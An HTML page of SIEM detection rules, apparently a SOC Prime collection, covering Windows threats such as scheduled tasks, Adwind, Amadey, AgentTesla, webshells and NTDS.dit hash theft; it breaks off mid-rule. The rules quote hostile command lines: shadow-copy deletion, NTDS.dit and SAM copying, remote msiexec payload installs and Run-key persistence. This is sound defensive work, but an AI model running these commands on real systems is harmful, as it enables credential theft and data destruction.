<html>
<title>Detection Rules</title>
<meta name="robots" content="noindex,nofollow" />
<link rel="stylesheet" href="w2.css">

<head>
<style>
html, body {
background-color: #f0f0f0;
}

.w3-topbar {
width: 100%;
height:5%;
background-color: black;
position: fixed;
top: 1px;
overflow: hidden;
}
#myInput {
background-repeat: no-repeat;
width: 40%;
border: 1px solid #ddd;
margin-left: 300px;
text-align: center;
font-family: "Roboto", sans-serif
}
#keywords {
background-repeat: no-repeat;
width: 28%;
border: 1px solid #ddd;
border: 1px solid #ddd;
margin-bottom: 2px;
margin-left: 300px;
text-align: center;
font-family: "Roboto", sans-serif
}
#myUL {
list-style-type: none;
padding: 0;
text-align: center;
margin-top: 10px;
width: 100%;
}
#myUL li a {
margin-top: -1px;
padding: 8px;
text-decoration: none;
font-size: 14px;
color: black;
display: block
}
}
</style>
</head>
<body>
<!-- Topbar -->
<div class="w3-topbar"></div>
<!-- Sidebar -->
<BR>
<p>
<BR>
<center><H3>Prime SOC Detection Rules</H3></center>
<BR>
<input type="text" id="myInput" onkeyup="myFunction()" placeholder="Filter Paragraph by Keyword" title="Search">
<form method="GET" onsubmit="myHilitor.apply(hilite.value); return false;">
<input type="text" id="keywords" size="20" name="hilite" placeholder="Highlight Multiple Keywords">
<input type="submit" value="Apply">
<input type="button" value="Remove" onclick="myHilitor.remove();">
</span>
</form>
</nav>
<div class="w3-main w3-theme-l5" style="margin-left:100px, margin-right:50px">
<div id="playground">
<center>
<ul id="myUL">
<p>
<p>
<li><a href="#">rule a_scheduled_task_was_created { meta: author = "Florian Roth(original) Lee Archinal(Updated)" description = "This detectes when a registry key is set under \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\ License: ." reference = "" version = "0.01" created = "2019/04/30" product = "windows" service = "sysmon" mitre = "execution, persistence, privelege_escalation, t1053, s0111" events: ((($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.file.full_path, `.*\\schtasks\.exe`) and re.regex($selection1.target.process.command_line, `.* /create .*`)) or ($selection1.metadata.product_event_type = "12" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\schtasks.exe")) or ($selection1.metadata.product_event_type = "13" and re.regex($selection1.target.registry.registry_key, `.*\\Schedule\\TaskCache\\Tasks\\`))) condition: $selection1 
<li><a href="#">rule a_variant_of_data_stealer_trojan_activity { meta: author = "Emir Erdogan" description = "This rule detects a stealer behaviour. Malware deletes itself License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1129, T1003, T1114, T1012, T1107" events: ((re.regex($selection.target.process.file.full_path, `.*/ralord\.exe`) or re.regex($selection.target.process.file.full_path, `.*/lodron\.exe`) or re.regex($selection.target.process.file.full_path, `.*/019\.exe`) or re.regex($selection.target.process.file.full_path, `.*/016\.exe`)) and (re.regex($selection.src.process.file.full_path, `.*/setup_file\.exe`) or re.regex($selection.src.process.file.full_path, `.*/setup_installer\.exe`))) condition: $selection 
<li><a href="#">rule a_variant_of_lokibot_trojan { meta: author = "Emir Erdogan" description = "this rule detects one of lokibot trojan malware. Phishing site downloads trojan via scam e-mail License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1081, T1566, T1192" events: (($selection.target.process.file.full_path = "C:\\Windows\\system32\\dllhost.exe" and re.regex($selection.src.process.file.full_path, `.*\\v\.exe`)) or re.regex($selection.src.hostname, `.*shehig\.com.*`)) condition: $selection 
<li><a href="#">rule a_webshell_ensiko_with_ransomware_capabilities { meta: author = "Osman Demir" description = "Ensiko is a PHP web shell with ransomware capabilities that targets various platforms such as Linux, Windows, macOS, or any other platform that has PHP installed. The malware has the capability to remotely control the system and accept commands to perform malicious activities on the infected machine. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "webserver" mitre = "T1505, Persistence" events: (($selection.network.http.method = "POST" and $selection.network.http.response_code = "200" and (re.regex($selection.target.url, `.*/webshell/shell\.php`) or re.regex($selection.target.url, `.*/webshell/shell\.php\?ganteng`)) and ($selection.target.url = "passwrd=RaBiitch&action=login&hide=&usrname=RaBiitch" or $selection.target.url = "key=password&method=1&submit=Submit")) or $selection.target.file.md5 = "5fdbf87b7f74327e9132b5edb5c217bdcf49fe275945d502ad675c1dd46e3db5") condition: $selection 
<li><a href="#">rule abusing_attribexe_to_change_file_attributes { meta: author = "Sreeman" description = "Detects possible abuse of attrib.exe to hide files and folder or to mark a file as a system file License: ." reference = "" version = "0.01" created = "2020/03/01" product = "Windows" mitre = "t1158, defense_evasion, persistence" events: (re.regex($selection.target.process.command_line, `.*attrib\.exe \+h.*`) or re.regex($selection.target.process.command_line, `.*attrib\.exe \+s.*`) or re.regex($selection.target.process.command_line, `.*attrib\.exe \+r.*`) or re.regex($selection.target.process.command_line, `.*attrib\.exe -h.*`) or re.regex($selection.target.process.command_line, `.*attrib\.exe -s.*`) or re.regex($selection.target.process.command_line, `.*attrib\.exe -r.*`)) condition: $selection 
<li><a href="#">rule abusing_azure_browser_sso { meta: author = "Den Iuzvyk" description = "Detects abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser. An attacker can use this to authenticate to Azure AD in a browser as that user. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "sysmon" product = "windows" mitre = "defense_evasion, privilege_escalation, t1073" events: (($selection_dll.metadata.product_event_type = "7" and re.regex($selection_dll.target.process.file.full_path, `.*MicrosoftAccountTokenProvider\.dll`)) and not ((re.regex($selection_dll.target.process.file.full_path, `.*BackgroundTaskHost\.exe`) or re.regex($selection_dll.target.process.file.full_path, `.*devenv\.exe`) or re.regex($selection_dll.target.process.file.full_path, `.*iexplore\.exe`) or re.regex($selection_dll.target.process.file.full_path, `.*MicrosoftEdge\.exe`)))) condition: $selection_dll 
<li><a href="#">rule abusing_managebdewsf { meta: author = "Den Iuzvyk" description = "Detects abusing of deprecated manage-bde.wsf. Tampering with manage-bde.wsf to run things in unattended ways. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, t1204, t1059" events: (re.regex($selection.target.process.file.full_path, `.*\\cscript\.exe`) and re.regex($selection.target.process.command_line, `.*cscript manage-bde\.wsf.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule abusing_security_support_provider_and_authentication_packages { meta: author = "Den Iuzvyk" description = "Detects activity that abuses Windows Security Support Provider (SSP) and Authentication Packages (AP) that come in the form of DLLs that get injected into LSASS.exe process on system boot or dynamically via AddSecurityPackage API. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "execution, t1204, t1059" events: ($selection_reg1.metadata.product_event_type = "13" and $selection_reg1.target.registry.registry_key = "HKLM\\system\\currentcontrolset\\control\\lsa\\Security Packages" and $selection_reg1.metadata.event_type = "SetValue") condition: $selection_reg1 
<li><a href="#">rule abusing_settingcontentms_to_launch_arbitrary_shell_command_execution { meta: author = "Sreeman" description = "None License: ." reference = "" version = "0.01" created = "2020/03/13" product = "Windows" mitre = "t1204, t1193, execution, initial_access" events: (re.regex($selection.target.process.command_line, `.*\.SettingContent-ms.*`) and not (re.regex($selection.target.file.full_path, `.*immersivecontrolpanel.*`))) condition: $selection 
<li><a href="#">rule abusing_windows_telemetry_compattelrunnerexeaudit_rule { meta: author = "Den Iuzvyk" description = "Detects abusing of CompatTelRunner.exe for persistance. License: ." reference = "" version = "0.01" created = "2020/04/09" category = "sysmon" product = "windows" mitre = "persistence, t1053" events: ($selection.metadata.product_event_type = "4657" and (re.regex($selection.target.registry.registry_value_data, `.*SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController.*\\Command.*`) or re.regex($selection.target.file.full_path, `.*SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController.*\\Command.*`))) condition: $selection 
<li><a href="#">rule access_to_admin_share { meta: author = "Florian Roth" description = "Detects access to $ADMIN share. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "lateral_movement, t1077" events: (($selection.metadata.product_event_type = "5140" and $selection.target.resource.name = "Admin$") and not (re.regex($selection.src.user.user_display_name, `.*$`))) condition: $selection 
<li><a href="#">rule account_discovery_activity_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This detects characteristics of account discovrery activity that adversaries could use License: ." reference = "" version = "0.01" created = "2019/07/06" product = "windows" service = "sysmon" mitre = "discovery, t1087" events: ($selection1.metadata.product_event_type = "1" and ($selection1.target.process.file.full_path = "C:\\Windows\\System32\\net.exe" or $selection1.target.process.file.full_path = "C:\\Windows\\System32\\query.exe") and ($selection1.target.process.command_line = "net user" or $selection1.target.process.command_line = "net user /domain" or $selection1.target.process.command_line = "dir c:\\Users\\" or $selection1.target.process.command_line = "cmdkey.exe /list" or $selection1.target.process.command_line = "net localgroup \"Users\"" or $selection1.target.process.command_line = "net localgroup" or $selection1.target.process.command_line = "get-localuser" or $selection1.target.process.command_line = "get-localgroupmembers -group Users" or $selection1.target.process.command_line = "ls C:/Users" or $selection1.target.process.command_line = "get-childitem C:\\Users\\" or re.regex($selection1.target.process.command_line, `get-aduser -filter .*`) or $selection1.target.process.command_line = "get-localgroup" or $selection1.target.process.command_line = "query user") and ($selection1.src.process.file.full_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" or $selection1.src.process.file.full_path = "C:\\Windows\\System32\\cmd.exe")) condition: $selection1 
<li><a href="#">rule account_tampering__suspicious_failed_logon_reasons { meta: author = "Florian Roth" description = "This method uses uncommon error codes on failed logons to determine suspicious activity and tampering with accounts that have been disabled or somehow restricted. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "persistence, privilege_escalation, t1078" events: (($selection.metadata.product_event_type = "4625" or $selection.metadata.product_event_type = "4776") and ($selection.security_result.description = "0xC0000072" or $selection.security_result.description = "0xC000006F" or $selection.security_result.description = "0xC0000070" or $selection.security_result.description = "0xC0000413" or $selection.security_result.description = "0xC000018C")) condition: $selection 
<li><a href="#">rule acer_quick_access__dll_searchorder_hijacking_and_potential_abuses { meta: author = "Osman Demir" description = "Detects (CVE-2019-18670) exploitation attempt License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "persistence, privilege_escalation, defense_evasion, T1038" events: (($selection1.metadata.product_event_type = "7" and re.regex($selection1.target.process.file.full_path, `.*/QAAdminAgent\.exe`) and ($selection1.target.process.file.full_path = "C:\\python27\\atiadlxx.dll" or $selection1.target.process.file.full_path = "C:\\python27\\atiadlxy.dll" or $selection1.target.process.file.full_path = "C:\\python27\\nvapi.dll")) or ($selection1.metadata.product_event_type = "11" and ($selection1.target.file.full_path = "C:\\python27\\atiadlxx.dll" or $selection1.target.file.full_path = "C:\\python27\\atiadlxy.dll" or $selection1.target.file.full_path = "C:\\python27\\nvapi.dll"))) condition: $selection1 
<li><a href="#">rule active_directory_as_a_c2_command__control { meta: author = "Furkan Celik" description = "Active Directory is a Central Authentication and Access control. It isimportant to control it. The service name does not appear either. The importantthing is to check the displayname License: ." reference = "" version = "0.01" created = "2020/02/03" product = "windows" service = "security" events: $selection.metadata.product_event_type = "5136" condition: $selection 
<li><a href="#">rule active_directory_replication_from_non_machine_account { meta: author = "Roberto Rodriguez @Cyb3rWard0g" description = "Detects potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials. License: ." reference = "" version = "0.01" created = "2019/07/26" product = "windows" service = "security" mitre = "credential_access, t1003" events: (($selection.metadata.product_event_type = "4662" and $selection.target.process.access_mask = "0x100" and (re.regex($selection.target.process.file.file_metadata.pe.import_hash, `.*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2.*`) or re.regex($selection.target.process.file.file_metadata.pe.import_hash, `.*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2.*`) or re.regex($selection.target.process.file.file_metadata.pe.import_hash, `.*89e95b76-444d-4c62-991a-0facbeda640c.*`))) and not (re.regex($selection.src.user.user_display_name, `.*$`))) condition: $selection 
<li><a href="#">rule activity_related_to_ntdsdit_domain_hash_retrieval { meta: author = "Florian Roth, Michael Haag" description = "Detects suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "credential_access, t1003" events: (($selection.target.process.command_line = "vssadmin.exe Delete Shadows" or $selection.target.process.command_line = "vssadmin create shadow /for=C:" or re.regex($selection.target.process.command_line, `copy \\\\\?\\GLOBALROOT\\Device\\.*\\windows\\ntds\\ntds\.dit`) or re.regex($selection.target.process.command_line, `copy \\\\\?\\GLOBALROOT\\Device\\.*\\config\\SAM`) or $selection.target.process.command_line = "vssadmin delete shadows /for=C:" or $selection.target.process.command_line = "reg SAVE HKLM\\SYSTEM " or re.regex($selection.target.process.command_line, `esentutl\.exe /y /vss .*\\ntds\.dit.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule ad_privileged_users_or_groups_reconnaissance { meta: author = "Samir Bousseaden" description = "Detect priv users or groups recon based on 4661 eventid and known privileged users or groups SIDs License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "discovery, t1087" events: ($selection.metadata.product_event_type = "4661" and ($selection.src.user.user_display_name = "SAM_USER" or $selection.src.user.user_display_name = "SAM_GROUP") and ((re.regex($selection.target.registry.registry_value_data, `.*-512`) or re.regex($selection.target.registry.registry_value_data, `.*-502`) or re.regex($selection.target.registry.registry_value_data, `.*-500`) or re.regex($selection.target.registry.registry_value_data, `.*-505`) or re.regex($selection.target.registry.registry_value_data, `.*-519`) or re.regex($selection.target.registry.registry_value_data, `.*-520`) or re.regex($selection.target.registry.registry_value_data, `.*-544`) or re.regex($selection.target.registry.registry_value_data, `.*-551`) or re.regex($selection.target.registry.registry_value_data, `.*-555`) or re.regex($selection.target.registry.registry_value_data, `.*admin.*`)) or (re.regex($selection.target.file.full_path, `.*-512`) or re.regex($selection.target.file.full_path, `.*-502`) or re.regex($selection.target.file.full_path, `.*-500`) or re.regex($selection.target.file.full_path, `.*-505`) or re.regex($selection.target.file.full_path, `.*-519`) or re.regex($selection.target.file.full_path, `.*-520`) or re.regex($selection.target.file.full_path, `.*-544`) or re.regex($selection.target.file.full_path, `.*-551`) or re.regex($selection.target.file.full_path, `.*-555`) or re.regex($selection.target.file.full_path, `.*admin.*`)))) condition: $selection 
<li><a href="#">rule add_programs_to_firewall_exclusion_from_temp_directory_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Add Programs To Firewall Exclusion From Temp Directory. License: ." reference = "" version = "0.01" created = "2019/02/25" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1059" events: ($selection.metadata.product_event_type = "1" and re.regex($selection.target.process.file.full_path, `.*\\netsh\.exe`) and re.regex($selection.target.process.command_line, `.*netsh firewall add allowedprogram \"C:\\Users\\admin\\AppData\\Local\\Temp.*`) and re.regex($selection.target.process.command_line, `.*ENABLE`)) condition: $selection 
<li><a href="#">rule addition_of_sid_history_to_active_directory_object { meta: author = "Thomas Patzke, @atc_project (improvements)" description = "An attacker can use the SID history attribute to gain additional privileges. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "persistence, privilege_escalation, t1178" events: (($selection1.metadata.product_event_type = "4765" or $selection1.metadata.product_event_type = "4766") or ($selection1.metadata.product_event_type = "4738" and not (($selection1.target.process.product_specific_process_id = "-" or $selection1.target.process.product_specific_process_id = "%%1793")))) condition: $selection1 
<li><a href="#">rule admin_user_rdp { meta: author = "Furkan Celik" description = "It shows those who log in remotely with admin account. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" events: ($selection.metadata.product_event_type = "4624" and $selection.extensions.auth.mechanism = "10" and $selection.src.application = "Negotiate" and re.regex($selection.src.user.user_display_name, `Admin-.*`)) condition: $selection 
<li><a href="#">rule admin_user_remote_logon { meta: author = "juju4" description = "Detect remote login by Administrator user depending on internal pattern License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "lateral_movement, t1078" events: ($selection.metadata.product_event_type = "4624" and $selection.extensions.auth.mechanism = "10" and $selection.src.application = "Negotiate" and re.regex($selection.src.user.user_display_name, `Admin-.*`)) condition: $selection 
<li><a href="#">rule adwind_detection { meta: author = "Ariel Millahuel" description = "Detects AdWind activity (also known as AlienSpy, Frutas, Unrecom, Sockrat, JSocket and jRat) License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, defense_evation, t1059, t1112" events: ((($selection1.target.process.file.full_path = "cmd.exe" or $selection1.target.process.file.full_path = "javaw.exe") and (re.regex($selection1.target.process.command_line, `.* cmd\.exe /C cscript\.exe C:\\Users.*\\AppData\\Local\\Temp\\Retrive5740188186602551395\.vbs .*`) or re.regex($selection1.target.process.command_line, `.* cmd\.exe /C cscript\.exe C:\\Users.*\\AppData\\Local\\Temp.*\.vbs .*`) or re.regex($selection1.target.process.command_line, `.* C:\\Program Files\\Java\\jre1\.8\.0_92\\bin\\javaw\.exe\" -jar C:\\Users.*\\AppData\\Roaming\\uyrysfn\.txt .*`) or re.regex($selection1.target.process.command_line, ` .*C:\\Program Files\\Java\\jre1\.8\.0_92\\bin\\javaw\.exe -jar C:\\Users.*\\AppData\\Roaming.*\.txt.* `)) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) or ($selection1.metadata.product_event_type = "13" and re.regex($selection1.target.registry.registry_key, `.* .*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run .* `) and re.regex($selection1.metadata.description, `.* C:\\Users\\admin\\AppData\\Roaming\\Oracle\\bin\\javaw\.exe -jar C:\\Users\\admin\\Oracle Corporations\\Oracles Java\.jar .*`))) condition: $selection1 
<li><a href="#">rule adwind_rat__jrat { meta: author = "Florian Roth, Tom Ueltschi" description = "Detects javaw.exe in AppData folder as used by Adwind / JRAT License: ." reference = "" version = "0.01" created = "2017/11/10" category = "process_creation" product = "windows" mitre = "execution, t1064" events: ((re.regex($selection.target.process.command_line, `.*\\AppData\\Roaming\\Oracle.*\\java.*\.exe .*`) or re.regex($selection.target.process.command_line, `.*cscript\.exe .*Retrive.*\.vbs .*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule adwind_rat__jrat_part_1 { meta: author = "Florian Roth, Tom Ueltschi" description = "Detects javaw.exe in AppData folder as used by Adwind / JRAT License: ." reference = "" version = "0.01" created = "2017/11/10" product = "windows" service = "sysmon" mitre = "execution, t1064" events: ($selection.metadata.product_event_type = "11" and (re.regex($selection.target.file.full_path, `.*\\AppData\\Roaming\\Oracle\\bin\\java.*\.exe`) or re.regex($selection.target.file.full_path, `.*\\Retrive.*\.vbs`))) condition: $selection 
<li><a href="#">rule adwind_rat__jrat_part_2 { meta: author = "Florian Roth, Tom Ueltschi" description = "Detects javaw.exe in AppData folder as used by Adwind / JRAT License: ." reference = "" version = "0.01" created = "2017/11/10" product = "windows" service = "sysmon" mitre = "execution, t1064" events: ($selection.metadata.product_event_type = "13" and re.regex($selection.target.registry.registry_key, `REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.*`) and re.regex($selection.metadata.description, `%AppData%\\Roaming\\Oracle\\bin\\.*`)) condition: $selection 
<li><a href="#">rule agenttesla_rat_detection { meta: author = "Emir Erdogan" description = "AgentTesla RAT Detection License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1053, T1081" events: ($selection.src.process.file.full_path = "8cab6413fdc97e9cc90607b3a49175a7.exe" and (re.regex($selection.target.process.file.full_path, `.*RegSvcs\.exe`) or $selection.target.process.file.full_path = "C:\\Windows\\System32\\schtasks.exe") and re.regex($selection.target.process.command_line, `.*/Create /TN \"Updates\\ZwqpnECNvoWf\" /XML \"C:\\Users\\admin\\AppData\\Local\\Temp\\tmp6CEB\.tmp\"`)) condition: $selection 
<li><a href="#">rule amadey_botnet_detection_ta505 { meta: author = "Ariel Millahuel" description = "This rule detects a bot called Amadey. This one is used in order to collect information victim's environment, though it can also deliver other malware. The threat actor is considered TA505 License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "execution, T1059" events: ($selection1.metadata.product_event_type = "13" and (re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.*`) or re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders.*`)) and (re.regex($selection1.metadata.description, `.* rundll32 C:\\Users.*\\AppData\\Local\\Temp\\cred\.dll, Main.*`) or re.regex($selection1.metadata.description, `.* rundll32 C:\\Users.*\\AppData\\Local\\Temp.*\.dll, Main.*`) or re.regex($selection1.metadata.description, `.*C:\\ProgramData\\87e4c89e95.*`) or re.regex($selection1.metadata.description, `.*C:\\ProgramData\\87.*`))) condition: $selection1 
<li><a href="#">rule amadey_botnet_detection_ta505_part_1 { meta: author = "Ariel Millahuel" description = "This rule detects a bot called Amadey. This one is used in order to collect information victim's environment, though it can also deliver other malware. The threat actor is considered TA505 License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, T1059" events: (($selection2.target.process.command_line = "rundll32.exe C:\\Users\\admin\\AppData\\Local\\Temp\\cred.dll, Main" or re.regex($selection2.target.process.command_line, `msiexec\.exe STOP=1 /i http://.*\..*\..*\..*/dom.* /q ksw=%TEMP%`) or re.regex($selection2.target.process.command_line, `msiexec\.exe STOP=1 /i https://.*\..*\..*\..*/dom.* /q ksw=%TEMP%`) or $selection2.target.process.command_line = "REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" /f /v Startup /t REG_SZ /d C:\\ProgramData\\87e4c89e95" or re.regex($selection2.target.process.command_line, `REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" /f /v Startup /t REG_SZ /d C:\\ProgramData\\87.*`)) and ($selection2.metadata.product_event_type = "4688" or $selection2.metadata.product_event_type = "1")) condition: $selection2 
<li><a href="#">rule anomalous_invocation_of_cmdexe { meta: author = "Joseph Kamau" description = "This rule detects when the cmd.exe is launched in a suspicious manner License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" category = "process_creation" mitre = "defense_evasion" events: (re.regex($selection1.target.process.file.full_path, `.*cmd\.exe`) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (re.regex($selection1.src.process.file.full_path, `.*rundll32\.exe`) or re.regex($selection1.src.process.file.full_path, `.*httpd\.exe`) or re.regex($selection1.src.process.file.full_path, `.*svchost\.exe`) or re.regex($selection1.src.process.file.full_path, `.*w3wp\.exe`))) condition: $selection1 
<li><a href="#">rule anonymous_user_changed_machine_password { meta: author = "SOC Prime Team" description = "Detects Anonymous Users Changing Machine Password. This is the behavior of many zerologon POCs. This behavior must be correlated with windows events - 4624/5829 or IDS events, like Zeek. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "lateral_movement, t1210" events: ($selection.metadata.product_event_type = "4742" and re.regex($selection.target.user.user_display_name, `.*$`) and (re.regex($selection.src.user.user_display_name, `.*anonymous.*`) or re.regex($selection.src.user.userid, `.*S-1-0.*`))) condition: $selection 
<li><a href="#">rule antivirus_exploitation_framework_detection { meta: author = "Florian Roth" description = "Detects a highly relevant Antivirus alert that reports an exploitation framework License: ." reference = "" version = "0.01" created = "2018/09/09" product = "antivirus" mitre = "execution, t1203, command_and_control, t1219" events: (re.regex($selection.target.registry.registry_value_data, `.*MeteTool.*`) or re.regex($selection.target.registry.registry_value_data, `.*MPreter.*`) or re.regex($selection.target.registry.registry_value_data, `.*Meterpreter.*`) or re.regex($selection.target.registry.registry_value_data, `.*Metasploit.*`) or re.regex($selection.target.registry.registry_value_data, `.*PowerSploit.*`) or re.regex($selection.target.registry.registry_value_data, `.*CobaltSrike.*`) or re.regex($selection.target.registry.registry_value_data, `.*Swrort.*`) or re.regex($selection.target.registry.registry_value_data, `.*Rozena.*`) or re.regex($selection.target.registry.registry_value_data, `.*Backdoor\.Cobalt.*`)) condition: $selection 
<li><a href="#">rule antivirus_password_dumper_detection { meta: author = "Florian Roth" description = "Detects a highly relevant Antivirus alert that reports a password dumper License: ." reference = "" version = "0.01" created = "2018/09/09" product = "antivirus" mitre = "credential_access, t1003" events: (re.regex($selection.target.registry.registry_value_data, `.*DumpCreds.*`) or re.regex($selection.target.registry.registry_value_data, `.*Mimikatz.*`) or re.regex($selection.target.registry.registry_value_data, `.*PWCrack.*`) or $selection.target.registry.registry_value_data = "HTool/WCE" or re.regex($selection.target.registry.registry_value_data, `.*PSWtool.*`) or re.regex($selection.target.registry.registry_value_data, `.*PWDump.*`)) condition: $selection 
<li><a href="#">rule antivirus_relevant_file_paths_alerts { meta: author = "Florian Roth" description = "Detects an Antivirus alert in a highly relevant file path or with a relevant file name License: ." reference = "" version = "0.01" created = "2018/09/09" product = "antivirus" events: (re.regex($selection.target.file.full_path, `C:\\Windows\\Temp\\.*`) or re.regex($selection.target.file.full_path, `C:\\Temp\\.*`) or re.regex($selection.target.file.full_path, `.*\\\\Client\\.*`) or re.regex($selection.target.file.full_path, `C:\\PerfLogs\\.*`) or re.regex($selection.target.file.full_path, `C:\\Users\\Public\\.*`) or re.regex($selection.target.file.full_path, `C:\\Users\\Default\\.*`) or re.regex($selection.target.file.full_path, `.*\.ps1`) or re.regex($selection.target.file.full_path, `.*\.vbs`) or re.regex($selection.target.file.full_path, `.*\.bat`) or re.regex($selection.target.file.full_path, `.*\.chm`) or re.regex($selection.target.file.full_path, `.*\.xml`) or re.regex($selection.target.file.full_path, `.*\.txt`) or re.regex($selection.target.file.full_path, `.*\.jsp`) or re.regex($selection.target.file.full_path, `.*\.jspx`) or re.regex($selection.target.file.full_path, `.*\.asp`) or re.regex($selection.target.file.full_path, `.*\.aspx`) or re.regex($selection.target.file.full_path, `.*\.php`) or re.regex($selection.target.file.full_path, `.*\.war`) or re.regex($selection.target.file.full_path, `.*\.hta`) or re.regex($selection.target.file.full_path, `.*\.lnk`) or re.regex($selection.target.file.full_path, `.*\.scf`) or re.regex($selection.target.file.full_path, `.*\.wsf`) or re.regex($selection.target.file.full_path, `.*\.wsh`)) condition: $selection 
<li><a href="#">rule antivirus_web_shell_detection { meta: author = "Florian Roth" description = "Detects a highly relevant Antivirus alert that reports a web shell License: ." reference = "" version = "0.01" created = "2018/09/09" product = "antivirus" mitre = "persistence, t1100" events: (re.regex($selection.target.registry.registry_value_data, `PHP/Backdoor.*`) or re.regex($selection.target.registry.registry_value_data, `JSP/Backdoor.*`) or re.regex($selection.target.registry.registry_value_data, `ASP/Backdoor.*`) or re.regex($selection.target.registry.registry_value_data, `Backdoor\.PHP.*`) or re.regex($selection.target.registry.registry_value_data, `Backdoor\.JSP.*`) or re.regex($selection.target.registry.registry_value_data, `Backdoor\.ASP.*`) or re.regex($selection.target.registry.registry_value_data, `.*Webshell.*`)) condition: $selection 
<li><a href="#">rule appinit_dll_hijacking_sysmon_behaviour { meta: author = "Emir Erdogan" description = "it can be used the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1103, T1055" events: ($selection.src.process.file.full_path = "C:\\Windows\\System32\\cmd.exe" and $selection.target.process.file.full_path = "C:\\Windows\\System32\\reg.exe" and (re.regex($selection.target.process.command_line, `.*HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs.*`) or re.regex($selection.target.process.command_line, `.*HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs.*`) or re.regex($selection.target.process.command_line, `.*HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\WindowsAppInit_DLLs.*`) or re.regex($selection.target.process.command_line, `.*HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs.*`))) condition: $selection 
<li><a href="#">rule apt_user_agent { meta: author = "Florian Roth" description = "Detects suspicious user agent strings used in APT malware in proxy logs License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" events: ($selection.src.application = "SJZJ (compatible; MSIE 6.0; Win32)" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0" or $selection.src.application = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 7.4; Win32;32-bit)" or $selection.src.application = "webclient" or $selection.src.application = "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/200" or $selection.src.application = "Mozilla/4.0 (compatible; MSI 6.0;" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/2" or $selection.src.application = 